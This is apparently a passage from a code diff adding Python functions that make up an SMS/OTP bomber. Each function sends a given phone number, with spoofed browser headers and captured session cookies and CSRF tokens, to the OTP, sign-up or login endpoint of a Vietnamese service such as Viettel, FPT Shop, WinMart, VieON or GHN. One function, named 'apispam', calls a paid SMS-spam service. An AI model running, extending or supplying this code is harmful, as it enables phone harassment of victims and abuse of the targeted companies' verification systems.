+    "x-requested-with":"mark.via.gp",
+    "sec-fetch-site":"same-origin",
+    "sec-fetch-mode":"cors",
+    "sec-fetch-dest":"empty",
+    "referer":"https://meta.vn/account/register",
+    "accept-encoding":"gzip, deflate, br",
+    "accept-language":"vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7",
+  }
+  rq = requests.post("https://meta.vn/app_scripts/pages/AccountReact.aspx?api_mode=1",data=data,headers=head).text
+def shopiness(sdt):
+  cookies = {
+    '_gcl_au': '1.1.713290776.1691278322',
+    '_gid': 'GA1.2.538313268.1691278323',
+    '_gat_UA-78703708-2': '1',
+    '_ga': 'GA1.1.1304515259.1691278323',
+    '_fbp': 'fb.1.1691278324147.1207721038',
+    '_ga_P138SCK22P': 'GS1.1.1691278323.1.1.1691278362.21.0.0',
+  }
+  headers = {
+    'Host': 'shopiness.vn',
+    'Connection': 'keep-alive',
+    # 'Content-Length': '63',
+    'Accept': '*/*',
+    'X-Requested-With': 'XMLHttpRequest',
+    'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
+    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+    'Origin': 'https://shopiness.vn',
+    'Sec-Fetch-Site': 'same-origin',
+    'Sec-Fetch-Mode': 'cors',
+    'Sec-Fetch-Dest': 'empty',
+    'Referer': 'https://shopiness.vn/khuyen-mai/pizza-hut-mua-1-tang-1-khi-giao-hang-tan-noi.80C793B3FC.html',
+    # 'Accept-Encoding': 'gzip, deflate, br',
+    'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
+    # 'Cookie': '_gcl_au=1.1.713290776.1691278322; _gid=GA1.2.538313268.1691278323; _gat_UA-78703708-2=1; _ga=GA1.1.1304515259.1691278323; _fbp=fb.1.1691278324147.1207721038; _ga_P138SCK22P=GS1.1.1691278323.1.1.1691278362.21.0.0',
+  }
+  data = {
+    'action': 'verify-registration-info',
+    'phoneNumber': f'{sdt}',
+    'refCode': '',
+  }
+  response = requests.post('https://shopiness.vn/ajax/user', cookies=cookies, headers=headers, data=data).json()
+def kiot(phone):
+    cookies = {
+        'AKA_A2': 'A',
+        'gkvas-uuid': 'b1b6bfdd-724e-449f-8acc-f3594f1aae3f',
+        'gkvas-uuid-d': '1687347271111',
+        'kvas-uuid': '1fdbe87b-fe8b-4cd5-b065-0900b3db04b6',
+        'kvas-uuid-d': '1687347276471',
+        'kv-session': '52268693-9db7-4b7d-ab00-0f5022612bc5',
+        'kv-session-d': '1687347276474',
+        '_fbp': 'fb.1.1687347277057.810313564',
+        '_hjFirstSeen': '1',
+        '_hjIncludedInSessionSample_563959': '1',
+        '_hjSession_563959': 'eyJpZCI6IjI0OTRjOTA0LTEwYzQtNGVkMS04MGViLWFhZWRjZTg5Y2FmMSIsImNyZWF0ZWQiOjE2ODczNDcyNzcxNTYsImluU2FtcGxlIjp0cnVlfQ==',
+        '_hjAbsoluteSessionInProgress': '1',
+        '_tt_enable_cookie': '1',
+        '_ttp': 'idt42AWvO5FQ_0j25HtJ7BSoA7J',
+        '_gid': 'GA1.2.1225607496.1687347277',
+        '_hjSessionUser_563959': 'eyJpZCI6ImRiOGYyMzEzLTdkMzItNTNmNi1hNWUzLTA4MjU5ZTE1MTRiOCIsImNyZWF0ZWQiOjE2ODczNDcyNzcxMzIsImV4aXN0aW5nIjp0cnVlfQ==',
+        '_ga_6HE3N545ZW': 'GS1.1.1687347278.1.1.1687347282.56.0.0',
+        '_ga_N9QLKLC70S': 'GS1.2.1687347283.1.1.1687347283.0.0.0',
+        '_fw_crm_v': '4c8714f2-5161-4721-c213-fe417c49ae65',
+        'parent': '65',
+        '_ga': 'GA1.2.1568204857.1687347277',
+    }
+
+    headers = {
+        'authority': 'www.kiotviet.vn',
+        'accept': 'application/json, text/javascript, */*; q=0.01',
+        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
+        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+        # 'cookie': 'AKA_A2=A; gkvas-uuid=b1b6bfdd-724e-449f-8acc-f3594f1aae3f; gkvas-uuid-d=1687347271111; kvas-uuid=1fdbe87b-fe8b-4cd5-b065-0900b3db04b6; kvas-uuid-d=1687347276471; kv-session=52268693-9db7-4b7d-ab00-0f5022612bc5; kv-session-d=1687347276474; _fbp=fb.1.1687347277057.810313564; _hjFirstSeen=1; _hjIncludedInSessionSample_563959=1; _hjSession_563959=eyJpZCI6IjI0OTRjOTA0LTEwYzQtNGVkMS04MGViLWFhZWRjZTg5Y2FmMSIsImNyZWF0ZWQiOjE2ODczNDcyNzcxNTYsImluU2FtcGxlIjp0cnVlfQ==; _hjAbsoluteSessionInProgress=1; _tt_enable_cookie=1; _ttp=idt42AWvO5FQ_0j25HtJ7BSoA7J; _gid=GA1.2.1225607496.1687347277; _hjSessionUser_563959=eyJpZCI6ImRiOGYyMzEzLTdkMzItNTNmNi1hNWUzLTA4MjU5ZTE1MTRiOCIsImNyZWF0ZWQiOjE2ODczNDcyNzcxMzIsImV4aXN0aW5nIjp0cnVlfQ==; _ga_6HE3N545ZW=GS1.1.1687347278.1.1.1687347282.56.0.0; _ga_N9QLKLC70S=GS1.2.1687347283.1.1.1687347283.0.0.0; _fw_crm_v=4c8714f2-5161-4721-c213-fe417c49ae65; parent=65; _ga=GA1.2.1568204857.1687347277',
+        'origin': 'https://www.kiotviet.vn',
+        'referer': 'https://www.kiotviet.vn/dang-ky/',
+        'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Windows"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'same-origin',
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
+        'x-requested-with': 'XMLHttpRequest',
+    }
+
+    data = {
+        'phone': '+84'+phone[1:],
+        'code': 'bancainayne',
+        'name': 'Cai Nit',
+        'email': 'ahihi123982@gmail.com',
+        'zone': 'An Giang - Huyện Châu Phú',
+        'merchant': 'bancainayne',
+        'username': '0972936627',
+        'industry': 'Điện thoại & Điện máy',
+        'ref_code': '',
+        'industry_id': '65',
+        'phone_input': "0338607465",
+    }
+
+    response = requests.post(
+        'https://www.kiotviet.vn/wp-content/themes/kiotviet/TechAPI/getOTP.php',
+        cookies=cookies,
+        headers=headers,
+        data=data,
+    ).text
+def fpt(phone):
+    requests.post("https://fptshop.com.vn/api-data/loyalty/Home/Verification", headers={"Host": "fptshop.com.vn","content-length": "16","accept": "*/*","content-type": "application/x-www-form-urlencoded; charset\u003dUTF-8","x-requested-with": "XMLHttpRequest","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Linux\"","origin": "https://fptshop.com.vn","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://fptshop.com.vn/","accept-encoding": "gzip, deflate, br"}, data={"phone":phone}).text
+def alfrescos(sdt):
+  data = '{"phoneNumber":"sdt","secureHash":"33f65da1c264ef7f519149065a600def","deviceId":"","sendTime":1691068424578,"type":2}'.replace("sdt",sdt)
+  head = {
+    "Host":"api.alfrescos.com.vn",
+    "accept":"application/json, text/plain, */*",
+    "brandcode":"ALFRESCOS",
+    "devicecode":"web",
+    "accept-language":"vi-VN",
+    "user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36",
+    "content-type":"application/json",
+    "origin":"https://alfrescos.com.vn",
+    "x-requested-with":"mark.via.gp",
+    "sec-fetch-site":"same-site",
+    "sec-fetch-mode":"cors",
+    "sec-fetch-dest":"empty",
+    "referer":"https://alfrescos.com.vn/",
+    "accept-encoding":"gzip, deflate, br",
+  }
+  rq = requests.post("https://api.alfrescos.com.vn/api/v1/User/SendSms?culture=vi-VN",data=data,headers=head).json()
+def poyeye(sdt):
+  data= '{"phone":"sdt","firstName":"Nguyen","lastName":"Hoang","email":"Khgf123@gmail.com","password":"1262007gdtg"}'
+  data = data.replace("sdt",sdt)
+  head = {
+    "Host":"api.popeyes.vn",
+    "accept":"application/json",
+    "x-client":"WebApp",
+    "user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36",
+    "content-type":"application/json",
+    "x-requested-with":"mark.via.gp",
+    "sec-fetch-site":"same-site",
+    "sec-fetch-mode":"cors",
+    "sec-fetch-dest":"empty",
+    "referer":"https://popeyes.vn/",
+    "accept-encoding":"gzip, deflate, br",
+  }
+  rq = requests.post("https://api.popeyes.vn/api/v1/register",data=data, headers=head).json()
+def vieon(sdt):
+  data = f'phone_number={sdt}&password=1262007Gdtg&given_name=&device_id=688e6ab3da160a362df3805047548504&platform=mobile_web&model=Android%208.1.0&push_token=&device_name=Chrome%2F114&device_type=desktop&isMorePlatform=true&ui=012021'
+  head = {
+    "Host":"api.vieon.vn",
+    "accept":"application/json, text/plain, */*",
+    "user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36",
+    "content-type":"application/x-www-form-urlencoded",
+    "x-requested-with":"mark.via.gp",
+    "sec-fetch-site":"same-site",
+    "sec-fetch-mode":"cors",
+    "sec-fetch-dest":"empty",
+    "referer":"https://vieon.vn/",
+    "accept-encoding":"gzip, deflate, br",
+  }
+  rq = requests.post("https://api.vieon.vn/backend/user/register/mobile?platform=mobile_web&ui=012021",data=data,headers=head).json()
+def tv360(sdt):
+  head = {
+    "Host":"m.tv360.vn",
+    "accept":"application/json, text/plain, */*",
+    "user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36",
+    "content-type":"application/json",
+  }
+  data = '{"msisdn":"sdt"}'
+  data = data.replace("sdt",sdt)
+  rq = requests.post("https://m.tv360.vn/public/v1/auth/get-otp-login",data=data,headers=head).json()
+  '''if not rq["errorCode"] == 200:
+    print("Lỗi 360tv")'''
+def winmart(sdt):
+  head = {
+    "Host":"api-crownx.winmart.vn",
+    "accept":"application/json",
+    "authorization":"Bearer undefined",
+    "user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36",
+    "x-requested-with":"mark.via.gp",
+    "sec-fetch-site":"same-site",
+    "sec-fetch-mode":"cors",
+    "sec-fetch-dest":"empty",
+    "referer":"https://winmart.vn/",
+    "accept-encoding":"gzip, deflate, br",
+    "accept-language":"vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7",
+  }
+  rq = requests.get(f"https://api-crownx.winmart.vn/as/api/web/v1/send-otp?phoneNo={sdt}",headers=head).json()
+def fptplay(phone):
+    Headers = {"Host": "api.fptplay.net","content-length": "89","sec-ch-ua": "\"Chromium\";v\u003d\"112\", \"Google Chrome\";v\u003d\"112\", \"Not:A-Brand\";v\u003d\"99\"","accept": "application/json, text/plain, */*","content-type": "application/json; charset\u003dUTF-8","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Android\"","origin": "https://fptplay.vn","sec-fetch-site": "cross-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://fptplay.vn/","accept-encoding": "gzip, deflate, br","accept-language": "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4"}
+    Datason = json.dumps({"phone": phone,"country_code":"VN","client_id":"vKyPNd1iWHodQVknxcvZoWz74295wnk8"})
+    response = requests.post("https://api.fptplay.net/api/v7.1_w/user/otp/register_otp?st\u003dEim9hpobCZPoIoVVokkIDA\u0026e\u003d1681802671\u0026device\u003dChrome(version%253A112.0.0.0)\u0026drm\u003d1", data=Datason, headers=Headers).json()
+def funring(sdt):
+  data ='{"username": "sdt"}'.replace("sdt",sdt)
+  head = {
+    "Host":"funring.vn",
+    "Connection":"keep-alive",
+    "Accept":"*/*",
+    "User-Agent":"Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36",
+    "Content-Type":"application/json",
+    "X-Requested-With":"mark.via.gp",
+    "Accept-Encoding":"gzip, deflate",
+    "Accept-Language":"vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7"
+  }
+  rq = requests.post("http://funring.vn/api/v1.0.1/jersey/user/getotp",data=data,headers=head).json()
+def apispam(phone):
+  cookies = {
+    '_ga': 'GA1.1.1928856259.1691039310',
+    'serverChoice': 'Server-IPv1',
+    '_ga_Y4RF4MF664': 'GS1.1.1691039309.1.1.1691039359.0.0.0',
+  }
+  headers = {
+    'authority': 'crowstore.online',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
+    'cache-control': 'max-age=0',
+    'content-type': 'application/x-www-form-urlencoded',
+    # 'cookie': '_ga=GA1.1.1928856259.1691039310; serverChoice=Server-IPv1; _ga_Y4RF4MF664=GS1.1.1691039309.1.1.1691039359.0.0.0',
+    'origin': 'https://crowstore.online',
+    'referer': 'https://crowstore.online/sms.php',
+    'sec-ch-ua': '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-platform': '"Windows"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'same-origin',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
+  }
+  data = {
+    'sodienthoai': phone,
+    'ten_server': 'Server-IPv1',
+    'key': 'freekey307',
+  }
+  response = requests.post('https://crowstore.online/sms.php', cookies=cookies, headers=headers, data=data).text
+def vietid(phone):
+    csrfget = requests.post("https://oauth.vietid.net/rb/login?next\u003dhttps%3A%2F%2Foauth.vietid.net%2Frb%2Fauthorize%3Fclient_id%3D83958575a2421647%26response_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fenbac.com%252Fmember_login.php%26state%3De5a1e5821b9ce96ddaf6591b7a706072%26state_uri%3Dhttps%253A%252F%252Fenbac.com%252F").text
+    csrf = csrfget.split('name="csrf-token" value="')[1].split('"/>')[0]
+    Headers = {"Host": "oauth.vietid.net","content-length": "41","cache-control": "max-age\u003d0","sec-ch-ua": "\"Chromium\";v\u003d\"110\", \"Not A(Brand\";v\u003d\"24\", \"Google Chrome\";v\u003d\"110\"","sec-ch-ua-mobile": "?1","sec-ch-ua-platform": "\"Android\"","upgrade-insecure-requests": "1","origin": "https://oauth.vietid.net","content-type": "application/x-www-form-urlencoded","user-agent": "Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534","accept": "text/html,application/xhtml+xml,application/xml;q\u003d0.9,image/avif,image/webp,image/apng,*/*;q\u003d0.8,application/signed-exchange;v\u003db3;q\u003d0.7","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://oauth.vietid.net/rb/login?next\u003dhttps%3A%2F%2Foauth.vietid.net%2Frb%2Fauthorize%3Fclient_id%3D83958575a2421647%26response_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fenbac.com%252Fmember_login.php%26state%3De5a1e5821b9ce96ddaf6591b7a706072%26state_uri%3Dhttps%253A%252F%252Fenbac.com%252F","accept-encoding": "gzip, deflate, br","accept-language": "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4","cookie": "_ga_H5VRTZBFLG\u003dGS1.1.1679234987.1.0.1679234987.0.0.0"}
+    Payload = {"csrf-token": csrf,"account": phone}
+    response = requests.post("https://oauth.vietid.net/rb/login?next\u003dhttps%3A%2F%2Foauth.vietid.net%2Frb%2Fauthorize%3Fclient_id%3D83958575a2421647%26response_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fenbac.com%252Fmember_login.php%26state%3De5a1e5821b9ce96ddaf6591b7a706072%26state_uri%3Dhttps%253A%252F%252Fenbac.com%252F", data=Payload, headers=Headers).text
+def dkvt(phone):
+    cookies = {
+        'laravel_session': '7FpvkrZLiG7g6Ine7Pyrn2Dx7QPFFWGtDoTvToW2',
+        '__zi': '2000.SSZzejyD3jSkdl-krbSCt62Sgx2OMHIUF8wXheeR1eWiWV-cZ5P8Z269zA24MWsD9eMyf8PK28WaWB-X.1',
+        'redirectLogin': 'https://viettel.vn/dang-ky',
+        'XSRF-TOKEN': 'eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ%3D%3D',
+    }
+
+    headers = {
+        'Accept': 'application/json, text/plain, */*',
+        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
+        'Connection': 'keep-alive',
+        'Content-Type': 'application/json;charset=UTF-8',
+        # 'Cookie': 'laravel_session=7FpvkrZLiG7g6Ine7Pyrn2Dx7QPFFWGtDoTvToW2; __zi=2000.SSZzejyD3jSkdl-krbSCt62Sgx2OMHIUF8wXheeR1eWiWV-cZ5P8Z269zA24MWsD9eMyf8PK28WaWB-X.1; redirectLogin=https://viettel.vn/dang-ky; XSRF-TOKEN=eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ%3D%3D',
+        'Origin': 'https://viettel.vn',
+        'Referer': 'https://viettel.vn/dang-ky',
+        'Sec-Fetch-Dest': 'empty',
+        'Sec-Fetch-Mode': 'cors',
+        'Sec-Fetch-Site': 'same-origin',
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
+        'X-CSRF-TOKEN': 'HXW7C6QsV9YPSdPdRDLYsf8WGvprHEwHxMBStnBK',
+        'X-Requested-With': 'XMLHttpRequest',
+        'X-XSRF-TOKEN': 'eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ==',
+        'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Windows"',
+    }
+
+    json_data = {
+        'msisdn': phone,
+    }
+
+    response = requests.post('https://viettel.vn/api/get-otp', cookies=cookies, headers=headers, json=json_data).text
+def viettel(phone):
+    cookies = {
+        'laravel_session': 'XDw3rSn7ipZocrQTQOYxheTOvGVO2BPLJJC9Iqpv',
+        '_gcl_au': '1.1.307401310.1685096321',
+        '_gid': 'GA1.2.1786782073.1685096321',
+        '_fbp': 'fb.1.1685096322884.1341401421',
+        '__zi': '2000.SSZzejyD3jSkdl-krWqVtYU9zQ-T61wH9TthuPC0NCqtr_NpqH9AtJY9_VMSN4xGC8Bx_P0PJzSyol__dXnArJCoDG.1',
+        'redirectLogin': 'https://vietteltelecom.vn/dang-ky',
+        '_ga_VH8261689Q': 'GS1.1.1685096321.1.1.1685096380.1.0.0',
+        '_ga': 'GA1.2.1385846845.1685096321',
+        '_gat_UA-58224545-1': '1',
+        'XSRF-TOKEN': 'eyJpdiI6Im4zUUJSaGRYRlJtaFNcL210cjdvQmJ3PT0iLCJ2YWx1ZSI6IkZKdHppMVJIU2xGU2l3RmFUeEpqM1Y5ZHFra0tnQjFCMVREMlwvUXpneENEd1VyMjI0aHQ4eWlVXC83a2VycmlCdCIsIm1hYyI6IjNmYTg4YThhOGNkZmQzZTQ4MGQ1MDBjMWVmMWNmYTAxNzYxNWMxM2NjZDY1MmZmYjFlYzViOTUyOTUxMmRiNWYifQ%3D%3D',
+    }
+
+    headers = {
+        'Accept': 'application/json, text/plain, */*',
+        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
+        'Connection': 'keep-alive',
+        'Content-Type': 'application/json;charset=UTF-8',
+        # 'Cookie': 'laravel_session=XDw3rSn7ipZocrQTQOYxheTOvGVO2BPLJJC9Iqpv; _gcl_au=1.1.307401310.1685096321; _gid=GA1.2.1786782073.1685096321; _fbp=fb.1.1685096322884.1341401421; __zi=2000.SSZzejyD3jSkdl-krWqVtYU9zQ-T61wH9TthuPC0NCqtr_NpqH9AtJY9_VMSN4xGC8Bx_P0PJzSyol__dXnArJCoDG.1; redirectLogin=https://vietteltelecom.vn/dang-ky; _ga_VH8261689Q=GS1.1.1685096321.1.1.1685096380.1.0.0; _ga=GA1.2.1385846845.1685096321; _gat_UA-58224545-1=1; XSRF-TOKEN=eyJpdiI6Im4zUUJSaGRYRlJtaFNcL210cjdvQmJ3PT0iLCJ2YWx1ZSI6IkZKdHppMVJIU2xGU2l3RmFUeEpqM1Y5ZHFra0tnQjFCMVREMlwvUXpneENEd1VyMjI0aHQ4eWlVXC83a2VycmlCdCIsIm1hYyI6IjNmYTg4YThhOGNkZmQzZTQ4MGQ1MDBjMWVmMWNmYTAxNzYxNWMxM2NjZDY1MmZmYjFlYzViOTUyOTUxMmRiNWYifQ%3D%3D',
+        'Origin': 'https://vietteltelecom.vn',
+        'Referer': 'https://vietteltelecom.vn/dang-nhap',
+        'Sec-Fetch-Dest': 'empty',
+        'Sec-Fetch-Mode': 'cors',
+        'Sec-Fetch-Site': 'same-origin',
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
+        'X-CSRF-TOKEN': 'dS0MwhelCkb96HCH9kVlEd3CxX8yyiQim71Acpr6',
+        'X-Requested-With': 'XMLHttpRequest',
+        'X-XSRF-TOKEN': 'eyJpdiI6Im4zUUJSaGRYRlJtaFNcL210cjdvQmJ3PT0iLCJ2YWx1ZSI6IkZKdHppMVJIU2xGU2l3RmFUeEpqM1Y5ZHFra0tnQjFCMVREMlwvUXpneENEd1VyMjI0aHQ4eWlVXC83a2VycmlCdCIsIm1hYyI6IjNmYTg4YThhOGNkZmQzZTQ4MGQ1MDBjMWVmMWNmYTAxNzYxNWMxM2NjZDY1MmZmYjFlYzViOTUyOTUxMmRiNWYifQ==',
+        'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Windows"',
+    }
+
+    json_data = {
+        'phone': phone,
+        'type': '',
+    }
+
+    response = requests.post('https://vietteltelecom.vn/api/get-otp-login', cookies=cookies, headers=headers, json=json_data).text
+def appota(sdt):
+  headers = {
+    'Host': 'vi.appota.com',
+    # 'content-length': '23',
+    'accept': 'application/json, text/javascript, */*; q=0.01',
+    'x-requested-with': 'XMLHttpRequest',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
+    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+    'origin': 'https://vi.appota.com',
+    'sec-fetch-site': 'same-origin',
+    'sec-fetch-mode': 'cors',
+    'sec-fetch-dest': 'empty',
+    'referer': 'https://vi.appota.com/',
+    # 'accept-encoding': 'gzip, deflate, br',
+    'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
+    # 'cookie': '_gid=GA1.2.794950800.1691145824; _ga_SQM4TCSQGX=GS1.1.1691145825.1.1.1691145870.0.0.0; pay_session=eyJpdiI6IkRieTVpNm1rTVVjWElNNnNoRENVVVE9PSIsInZhbHVlIjoiVTdCSTdYQ0gyM2Z2UFlkbStCaWtldjNGdlpsSm5lRk9kNVpMbkQxTysydGNPSGhXSk9CT0xmNVhReUp4TXVkaTQ2XC9PYTZrRUZUSE1kXC9Jbm1WbTNuUT09IiwibWFjIjoiNjAxYTBhMjlhYWE0N2RiMTA3ZTg5MGZjOWNjZmVlOWM1MzNkMjhlZGI0NjNmMGYxYmVhNGI5MWM3MmZiZGU1MSJ9; _ga=GA1.2.626969575.1691145824; _gat=1; _fbp=fb.1.1691145877829.1126099989; _ga_8W5EGNGFDP=GS1.2.1691145878.1.0.1691145878.0.0.0',
+  }
+  data = {
+    'phone_number': f'{sdt}',
+  }
+  response = requests.post('https://vi.appota.com/check-phone-register.html',data=data,headers=headers).text
+def ghn(sdt):
+  headers = {
+    'Host': 'online-gateway.ghn.vn',
+    # 'content-length': '40',
+    'accept': 'application/json, text/plain, */*',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
+    'content-type': 'application/json',
+    'origin': 'https://sso.ghn.vn',
+    'x-requested-with': 'mark.via.gp',
+    'sec-fetch-site': 'same-site',
+    'sec-fetch-mode': 'cors',
+    'sec-fetch-dest': 'empty',
+    'referer': 'https://sso.ghn.vn/',
+    # 'accept-encoding': 'gzip, deflate, br',
+    'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
+    
+  }
+  data = '{"phone":"sdt","type":"register"}'.replace("sdt",sdt)
+  response = requests.post('https://online-gateway.ghn.vn/sso/public-api/v2/client/sendotp', headers=headers, data=data).json()
+def best_inc(sdt):
+  headers = {
+    'Host': 'v9-cc.800best.com',
+    'Connection': 'keep-alive',
+    # 'Content-Length': '53',
+    'x-timezone-offset': '7',
+    'x-auth-type': 'web-app',
+    'x-nat': 'vi-VN',
+    'x-lan': 'VI',
+    'authorization': 'null',
+    'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
+    'content-type': 'application/json',
+    'accept': 'application/json',
+    'lang-type': 'vi-VN',
+    'Origin': 'https://best-inc.vn',
+    'X-Requested-With': 'mark.via.gp',
+    'Sec-Fetch-Site': 'cross-site',
+    'Sec-Fetch-Mode': 'cors',
+    'Sec-Fetch-Dest': 'empty',
+    'Referer': 'https://best-inc.vn/',
+    'Accept-Encoding': 'gzip, deflate, br',
+    'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
+  }
+  data = '{"phoneNumber":"sdt","verificationCodeType":1}'.replace("sdt",sdt)
+  response = requests.post('https://v9-cc.800best.com/uc/account/sendsignupcode',data=data,headers=headers).text
+def sapo(sdt):
+  headers = {
+    'Host': 'www.sapo.vn',
+    # 'content-length': '22',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
+    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+    'accept': '*/*',
+    'origin': 'https://www.sapo.vn',
+    'x-requested-with': 'mark.via.gp',
+    'sec-fetch-site': 'same-origin',
+    'sec-fetch-mode': 'cors',
+    'sec-fetch-dest': 'empty',
+    'referer': 'https://www.sapo.vn/blog/mat-hang-kinh-doanh-hot-nhat-hien-nay',
